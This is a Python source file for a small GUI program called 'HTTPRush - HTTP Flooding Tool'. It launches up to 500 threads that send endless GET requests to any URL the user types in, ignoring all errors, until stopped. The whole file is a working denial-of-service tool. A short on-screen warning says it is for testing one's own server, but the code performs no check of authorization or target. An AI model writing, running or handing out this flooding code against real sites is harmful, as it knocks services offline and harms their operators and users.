import requests
import threading
import tkinter as tk
from tkinter import messagebox

class HTTPRush:
    def __init__(self, master):
        self.master = master
        master.title("HTTPRush - HTTP Flooding Tool")
        master.geometry("400x220")
        master.configure(bg="#f0f0f0")

        self.url_label = tk.Label(master, text="URL:", bg="#f0f0f0", font=("Helvetica", 12, "bold"))
        self.url_label.pack(pady=10)
        self.url_entry = tk.Entry(master, width=60, bg="#ffffff", fg="#333333", font=("Helvetica", 12))
        self.url_entry.pack()

        self.threads_label = tk.Label(master, text="Threads:", bg="#f0f0f0", font=("Helvetica", 12, "bold"))
        self.threads_label.pack(pady=5)
        self.threads_entry = tk.Spinbox(master, from_=1, to=500, width=10, bg="#ffffff", fg="#333333", font=("Helvetica", 12))
        self.threads_entry.delete(0, tk.END)
        self.threads_entry.insert(0, "100")
        self.threads_entry.pack()

        self.start_button = tk.Button(master, text="Start Flooding", command=self.start_flooding, bg="#4CAF50", fg="#ffffff", font=("Helvetica", 12, "bold"), padx=10, pady=5)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(master, text="Stop Flooding", command=self.stop_flooding, state=tk.DISABLED, bg="#F44336", fg="#ffffff", font=("Helvetica", 12, "bold"), padx=10, pady=5)
        self.stop_button.pack(pady=5)

        self.warning_label = tk.Label(master, text="WARNING: This tool is for ethical purposes only, such as testing your own server's limits or responsibly disclosing vulnerabilities. Unauthorized use is illegal and unethical.", bg="#f0f0f0", fg="#ff0000", font=("Helvetica", 10), wraplength=380)
        self.warning_label.pack(pady=10)

        self.about_label = tk.Label(master, text="Made by: Just A Random", bg="#f0f0f0", fg="#666666", font=("Helvetica", 16, "bold"), anchor="center")
        self.about_label.pack(pady=5)

        self.flooding = False
        self.threads = []
    def start_flooding(self):
        url = self.url_entry.get()
        threads = int(self.threads_entry.get())

        if not url:
            messagebox.showerror("Error", "Please enter a valid URL.")
            return

        self.flooding = True
        self.stop_button.config(state=tk.NORMAL)
        self.start_button.config(state=tk.DISABLED)

        def flood():
            while self.flooding:
                try:
                    requests.get(url)
                except:
                    pass

        threads = min(threads, 500)
        for _ in range(threads):
            thread = threading.Thread(target=flood)
            thread.start()
            self.threads.append(thread)

    def stop_flooding(self):
        self.flooding = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        for thread in self.threads:
            thread.join()

if __name__ == "__main__":
    root = tk.Tk()
    root.title("HTTPRush")
    root.geometry("400x220")
    root.configure(bg="#f0f0f0")
    app = HTTPRush(root)
    root.mainloop()
